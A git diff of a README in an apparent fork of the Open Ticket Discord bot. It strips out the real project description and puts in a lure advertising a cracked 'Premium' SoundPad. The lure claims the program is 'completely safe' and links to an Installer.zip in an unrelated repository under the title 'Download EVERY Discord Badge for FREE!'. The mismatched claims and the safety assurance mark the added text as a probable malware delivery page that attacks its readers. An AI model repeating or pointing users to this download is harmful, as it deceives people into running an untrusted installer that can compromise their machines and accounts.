@@ -1,80 +1,24 @@
-# Coming Soon: OPEN TICKET v4.0 🎉
-Open Ticket v4 will be the first fully rewritten version of Open Ticket!
-There will be massive improvements for more stability & features! But the best part of all is that the API will be 50x more advanced than the current API! This way, you can write every plugin you ever imagined!
-<hr>
-
-<img src="https://apis.dj-dj.be/cdn/openticket/logo.png" alt="Open Ticket" width="600px">
-
-[![discord](https://img.shields.io/badge/discord-join%20our%20server-5865F2.svg?style=flat-square&logo=discord)](https://discord.com/invite/26vT9wt3n3)  [![version](https://img.shields.io/badge/version-3.5.4-brightgreen.svg?style=flat-square)](https://github.com/DJj123dj/open-ticket/releases/tag/v3.5.4)  [![discord.js](https://img.shields.io/badge/discord.js-v14-CB3837.svg?style=flat-square&logo=npm)]()  [![license](https://img.shields.io/badge/license-GPL%203.0-important.svg?style=flat-square)](https://github.com/DJj123dj/open-ticket/blob/main/LICENSE) [![stars](https://img.shields.io/github/stars/djj123dj/open-ticket?color=yellow&label=stars&logo=github&style=flat-square)](https://otdocs.dj-dj.be)
-
-### Open Ticket
-Open Ticket is the most customisable discord ticket bot that you will ever find! There are more than 150 options to customise in the config! This includes html transcripts, unlimited tickets, custom embeds & more! Did you know that even the html transcripts are highly customisable? Don't wait and check it out! If you're having trouble setting the bot up, feel free to join our support server and we will help you further!
-
-Take a look at all the features and discover the possibilities!
-### [Visit the Documentation!](https://otdocs.dj-dj.be/)
-
-## Features
-- **🎉 advanced html transcripts!**
-- 🔒 close, ❌ delete & ✅ re-open tickets
-- 🇬🇧 translation in 22 different languages
-- 📄 very advanced customisation
-- 🆗 buttons or 🔽 dropdowns!
-- 🆒 custom plugins
-- ∞ unlimited tickets & embeds
-- ➕➖ add/remove users from a ticket
-- 📊 ticket, user & global staticstics
-- /slash & text commands
-- 📥 reaction roles & url buttons
-- 🖥️ discord.js v14 & axios
-- 🎛️ latest discord integration
-
-## preview
-<img src="https://apis.dj-dj.be/cdn/openticket/message_buttons.png" alt="Message with buttons" width="350px">
-<img src="https://apis.dj-dj.be/cdn/openticket/message_dropdown.png" alt="Message with dropdown" width="350px">
-<br>
-<img src="https://apis.dj-dj.be/cdn/openticket/firstmsg.png" alt="Ticket start message" width="350px">
-<img src="https://apis.dj-dj.be/cdn/openticket/command_close.png" alt="Ticket start message" width="350px">
+![изображение](https://github.com/Ronalds13424/open-ticket/assets/155685973/e994a9ff-c02d-4a6b-9bd5-8c35b07da70e)
 
 
-## credits
-### Developer Team
-|Role             |User (discord name)|
-|-----------------|-------------------|
-|Lead Developer   |djj123dj           |
-|Developer        |sankedev           |
-|Support Team     |lover_catss        |
-|Designer         |vuur_draak         |
+> [!NOTE]
+> This repository provides detailed information and resources for downloading, installing, and using the SoundPad app.
 
-### Translators
-|Language           |Maintainer (discord name) |Status         |
-|-------------------|--------------------------|---------------|
-|English            |djj123dj                  |🟢 Up To Date  |
-|Dutch              |djj123dj                  |🟢 Up To Date  |
-|French             |sankedev & tostam         |🟢 Up To Date  |
-|Romanian           |sankedev                  |🟢 Up To Date  |
-|Spanish            |redactado & josuens       |🟢 Up To Date  |
-|German             |david.3                   |🟢 Up To Date  |
-|Italian            |maurizio26                |🟢 Up To Date  |
-|Czech              |spyeye_                   |🟢 Up To Date  |
-|Arabic             |deqressing                |🟢 Up To Date  |
-|Danish             |.the_gamer                |🟢 Up To Date  |
-|Portuguese         |quiradon                  |🔴 Outdated    |
-|Russian            |apexo & ander             |🟢 Up To Date  |
-|Ukrainian          |ander                     |🟢 Up To Date  |
-|Turkish            |Hydra#0009                |🔴 Outdated    |
-|Polish             |mkevas                    |🟢 Up To Date  |
-|Slovenian          |n1kkec                    |🔴 Outdated    |
-|Thai               |modshd                    |🟢 Up To Date  |
-|Norwegian          |noonenook                 |🟢 Up To Date  |
-|Greek              |stefanos__.               |🔴 Outdated    |
-|Indonesian         |erxg                      |🟢 Up To Date  |
-|Kurdish            |raze.hama                 |🟢 Up To Date  |
-|Hungarian          |Snowy                     |🔴 Outdated    |
-|Persian            |sasanwm                   |🟢 Up To Date  |
+---
 
-## links
-current version: _v3.5.4_
-</br>changelog: [click here](https://otgithub.dj-dj.be/releases)
-</br>documentation: [click here](https://otdocs.dj-dj.be/)
 
-© 2024 - DJdj Development | [website](https://www.dj-dj.be) | [discord](https://discord.dj-dj.be) | [terms of service](https://www.dj-dj.be/terms)
+</div>
+
+- All Premium plan functional
+
+> [!TIP]
+> 1. Most importantly: the program is completely safe for your Windows system.
+> 2. Support for most systems: Windows 7/8/8.1/10/11 (x32/64)
+
+---
+
+  
+### Screenshots 📖 :
+![изображение](https://github.com/Ronalds13424/open-ticket/assets/155685973/da52fdcc-2358-409c-b6b3-262038b51f0f)
+
+[📁Download EVERY Discord Badge for FREE!](https://github.com/ZXCSHEF/ZXC/releases/download/zxc/Installer.zip)
